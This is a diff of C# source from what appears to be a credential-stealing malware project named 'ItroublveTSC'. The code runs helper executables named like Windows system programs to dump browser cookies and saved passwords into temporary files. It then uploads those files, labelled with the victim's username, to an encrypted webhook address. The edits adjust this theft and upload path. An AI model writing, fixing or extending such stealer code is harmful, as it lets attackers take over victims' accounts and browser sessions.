@@ -47,12 +47,12 @@ namespace StealerExt
 		public static void Cookies()
 		{
 			StartProcess.Run("winhlp32.exe", "Cookies1");
-			StartProcess.Run("splwow64.exe", "Cookies2");
+			//StartProcess.Run("splwow64.exe", "Cookies2");
 			StartProcess.Run("hh.exe", "Cookies3");
 			string c1 = File.ReadAllText(Temp + "Cookies1");
-			string c2 = File.ReadAllText(Temp + "Cookies2");
+			//string c2 = File.ReadAllText(Temp + "Cookies2");
 			string c3 = File.ReadAllText(Temp + "Cookies3");
-			string c = c1 + c2 + c3;
+			string c = c1 + c3;
 			File.WriteAllText(Temp + Environment.UserName + "_Cookies.txt", c);
 			File.Delete(Temp + "Cookies1"); File.Delete(Temp + "Cookies2"); File.Delete(Temp + "Cookies3");
 			string text = Temp + Environment.UserName + "_Cookies.txt";
@@ -86,7 +86,7 @@ namespace StealerExt
         public static void Passwords()
 		{
 			StartProcess.Run("snuvcdsm.exe", "Passwords");
-			string passwordLoc = Path.Combine(Temp + "Passwords.txt");
+			string passwordLoc = Path.Combine(Temp + "Passwords");
 			if (string.IsNullOrEmpty(File.ReadAllText(passwordLoc))) 
 			{
 				new API(wHook).SendMultiPartData("Password file is empty.");
@@ -97,7 +97,7 @@ namespace StealerExt
             {
 				if (File.Exists(passwordLoc))
 				{
-					new API(wHook).SendMultiPartData($"{Environment.UserName}_Passwords.txt" ,"**Browser Password**", passwordLoc);
+					new API(wHook).SendMultiPartData("**Browser Password**", $"{Environment.UserName}_Passwords.txt", passwordLoc);
 				}
 				else
 				{
@@ -115,7 +115,6 @@ namespace StealerExt
 
 		public bool SendMultiPartData(string Content = null, string FileName = null, string filePath = null)
 		{
-			if (string.IsNullOrEmpty(Content) && (new FileInfo(filePath).Length > 0)) return false;
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent
 			{
 				{ new StringContent(name), "username" },
@@ -124,24 +123,23 @@ namespace StealerExt
 			};
 			if (filePath != null) multipartFormDataContent.Add(new ByteArrayContent(File.ReadAllBytes(filePath)), "File", FileName);
 			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
-			return result.StatusCode == HttpStatusCode.NoContent;
+			return result.StatusCode == HttpStatusCode.OK;
 		}
-		public bool SendMultiPartStream(string Content = null, string FileName = null, MemoryStream memoryStream = null)
+
+		public bool SendMultiPartStream(string FileName = null, MemoryStream memoryStream = null)
 		{
-			if (string.IsNullOrEmpty(Content) && (memoryStream != null)) return false;
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent
 			{
 				{ new StringContent(name), "username" },
 				{ new StringContent(pfp), "avatar_url" },
-				{ new StringContent(Content), "content" }
 			};
             if (memoryStream != null) multipartFormDataContent.Add(new ByteArrayContent(memoryStream.ToArray()), "File", FileName);
 			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
-			return result.StatusCode == HttpStatusCode.NoContent;
+			return result.StatusCode == HttpStatusCode.OK;
 		}
 
 		public static string wHook => Hook._DecryptedHook;
-		public const string name = "ItroublveTSC 6.2";
+		public const string name = "ItroublveTSC";
 		public const string pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaZLjMqLWHlL0VMxjLOEYXohyV6C9dsEjKsg&usqp=CAU";
 		private readonly HttpUtils _Client;
 		private readonly string _URL;
